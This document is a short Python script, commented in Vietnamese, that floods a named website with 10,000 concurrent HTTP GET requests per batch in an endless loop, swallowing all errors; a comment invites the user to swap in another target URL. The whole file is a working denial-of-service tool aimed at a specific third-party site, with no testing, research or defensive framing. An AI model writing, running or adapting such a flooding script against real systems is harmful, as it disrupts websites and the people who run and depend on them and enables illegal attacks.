import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor

URL = "http://kodoani.com"  # THAY ĐỔI URL
REQUESTS = 10000
CONCURRENCY = 10000

def make_request():
    """Hàm thực hiện một request duy nhất"""
    try:
        # Gửi request với timeout 3 giây
        requests.get(URL, timeout=3)
    except requests.RequestException:
        pass  # Bỏ qua các lỗi nếu có

def send_requests():
    """Hàm thực hiện tất cả requests"""
    # Sử dụng ThreadPoolExecutor để xử lý concurrent requests
    with ThreadPoolExecutor(max_workers=CONCURRENCY) as executor:
        # Tạo list các task
        futures = [executor.submit(make_request) for _ in range(REQUESTS)]
        # Chờ tất cả các task hoàn thành
        for future in futures:
            future.result()
    print(f"Đã hoàn thành {REQUESTS} requests")

# Vòng lặp vô hạn
while True:
    send_requests()
    time.sleep(1)  # Đợi 1 giây trước khi thực hiện lại
